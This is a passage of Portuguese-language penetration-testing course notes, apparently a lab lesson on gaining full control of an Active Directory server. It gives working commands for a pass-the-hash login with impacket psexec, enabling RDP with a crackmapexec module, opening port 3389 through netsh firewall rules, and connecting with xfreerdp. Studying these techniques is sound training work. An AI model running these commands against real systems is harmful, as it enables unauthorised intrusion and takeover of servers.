<h1 align="center"> Conclusao - Acesso completo ao Servidor</h1>
<hr>

Agora a gente vai obter acesso completo ao servidor , vamos melhorar o nosso ataque.

Na aula passada obtemos todos os hashes dos usuarios do AD inclusive do administrador.

Vamos suport que a gente nao conseguiu quebrar ou descobrir a senha do administrador mas temos o hash dele, entao vamos usar a tecnica de [[Pass the Hash]] nesse servidor.

Ainda podemos continuar usando o psexec e faremos o seguinte:

```sh
python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrador@<IP DO SERVIDOR> -hashes 'hashdoservidor'
```

Outra coisa legal , vamos escanear o servidor denovo e ir para a porta 3389 

```sh
nmap --open -p 3389 -sS -Pn 172.16.1.243
```

Podemos usar o acesso admin para alterar o registro ou via linha de comando mesmo habilitar o RDP ou usar ate o proprio modulo do <span style='color:var(--mk-color-red)'>crackmapexec</span> .

O crackmapexec tem varios modulos se usarmos a opcao `crackmapexec -L` podemos ver quais sao.

Um deles eh o <span style='color:var(--mk-color-teal)'>RDP</span> . Vamos usa-lo

```sh
crackmapexec smb <IP DO SERVIDOR> -u egabriel -p 'senhagabriel' -M rdp -o ACTION=enable
```

Ao fazer isso ele vai habilitar o rdp no servidor .

Verificamos novamente a porta 3389 (RDP) no servidor com nmap

```sh
nmap -p 3389 -sS -Pn <IP SERVER>
```

Se estiver filtrada ainda , nao conseguiremos acessar ele ainda , porque ? Porque ha bloqueio de firewall ainda. se usarmos o netstat para vermos se esta em execucao vemos que ela nao esta liberada .

Entao podemos usar o comando com acesso administrativo:

```sh
netsh advfirewall add rule name="rpd" protocol=TCP dir=in localport=3389 action=allow
```

Entao estamos fazendo uma acao no firewall via linha de comando para permitir o acesso a porta <span style='color:var(--mk-color-purple)'>3389</span>.

Perfeito , escaneamos denovo.

```sh
nmap -p 3389 -sS -Pn <IP SERVER>
```

E podemos usar o xfreerdp para tentarmos conectar ao servidor remotamente

```sh
xfreerdp /u:egrbriel /v:<IP DO SERVIDOR> /p:senha
```

E temos acesso remotamente a tudo basicamente.